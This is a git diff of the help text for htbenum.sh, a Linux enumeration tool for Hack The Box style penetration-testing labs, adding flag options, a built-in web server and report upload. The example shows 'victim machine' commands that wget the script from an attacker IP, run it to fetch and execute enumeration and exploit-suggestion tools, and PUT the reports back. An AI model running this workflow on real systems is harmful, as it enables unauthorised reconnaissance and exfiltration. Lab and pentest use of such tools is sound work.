@@ -26,23 +26,33 @@ function banner () {
 
 function usage () {
 		echo -e "${GREEN} Usage:";
-		echo -e "${GREEN}         ./htbenum.sh [update] IP port [directory]\n";
+		echo -e "${GREEN}         ./htbenum.sh [-u] -i IP -p port [-o directory] [-w] [-r]\n";
 		echo -e "${GREEN}         htbenum is designed do Linux enumeration in environments like Hack The Box where ";
-		echo -e "${GREEN}         you do not have direct internet access to download scripts and tools.\n";
+		echo -e "${GREEN}         you do not have direct Internet access to download scripts and tools.\n";
 		echo -e "${GREEN}         It will download enumeration and exploit suggestion scripts to a Linux host and ";
-		echo -e "${GREEN}         automatically execute them, providing a saved text report for each tool. Simply ";
-		echo -e "${GREEN}         upload htbenum.sh to a host, run with the IP and port of a webserver hosting the ";
-		echo -e "${GREEN}         tools, and they will be downloaded to /tmp (or an optional user-defined directory) ";
-		echo -e "${GREEN}         executed, with report output also being saved to /tmp or a custom directory.\n";
+		echo -e "${GREEN}         automatically execute them, providing a saved text report for each tool, and ";
+		echo -e "${GREEN}         optionally upload the reports back top the host machine. Simply upload htbenum.sh ";
+		echo -e "${GREEN}         to a host, run with the IP and port of the builtin web server hosting the tools ";
+		echo -e "${GREEN}         (or use your own), and they will be downloaded to /tmp (or an optional user-defined ";
+		echo -e "${GREEN}         directory) and executed, with report output being saved to /tmp or a custom directory.";
+		echo -e "${GREEN}         The reports can also optionally be uploaded back to your host machine.\n";
 		echo -e "${GREEN}         Note: Before running this tool on the target host, make sure to run it locally with ";
 		echo -e "${GREEN}         the update parameter in order to download all the necessary tools to the current ";
-		echo -e "${GREEN}         directory. Then start a local webserver in the same directory to host the tools, e.g. ";
-		echo -e "${GREEN}         \`python3 -m http.server 80\` or \`python -m SimpleHTTPServer 80\`.\n";
+		echo -e "${GREEN}         directory. Then start the builtin web server to host the tools and receive the reports.\n ";
+		echo -e "${GREEN} Example:";
+		echo -e "${GREEN}         Host machine: root@kali:~/htbenum# ./htbenum.sh -u";
+		echo -e "${GREEN}         Host machine: root@kali:~/htbenum# ./htbenum.sh -i 10.10.14.1 -p 80 -w";
+		echo -e "${GREEN}         Victim machine: www-data@victim:/tmp$ wget http://10.10.14.1:80/htbenum.sh";
+		echo -e "${GREEN}         Victim machine: www-data@victim:/tmp$ chmod +x ./htbenum.sh";
+		echo -e "${GREEN}         Victim machine: www-data@victim:/tmp$ ./htbenum.sh -i 10.10.14.1 -p 80 -r\n";
 		echo -e "${GREEN} Parameters:";
-		echo -e "${GREEN}         update - Download latest versions of each tool, overwriting any existing versions.";
-		echo -e "${GREEN}         IP - IP address of the listening web server used to tools for download.";
-		echo -e "${GREEN}         port - TCP port of the listening web server used to tools for download.";
-		echo -e "${GREEN}         directory - custom download and report creation directory (default is /tmp).";
+		echo -e "${GREEN}         -h - View help and usage.";
+		echo -e "${GREEN}         -i IP - IP address of the listening web server used for upload and download.";
+		echo -e "${GREEN}         -p port - TCP port of the listening web server used for upload and download.";
+		echo -e "${GREEN}         -o directory - Custom download and report creation directory (default is /tmp).";
+		echo -e "${GREEN}         -w - Start builtin web server for downloading files and uploading reports.";
+		echo -e "${GREEN}         -u - Update to the latest versions of each tool, overwriting any existing versions.";
+		echo -e "${GREEN}         -r - Upload reports back to the host machine web server (must support PUT requests).";
 }
 
 # Arguments
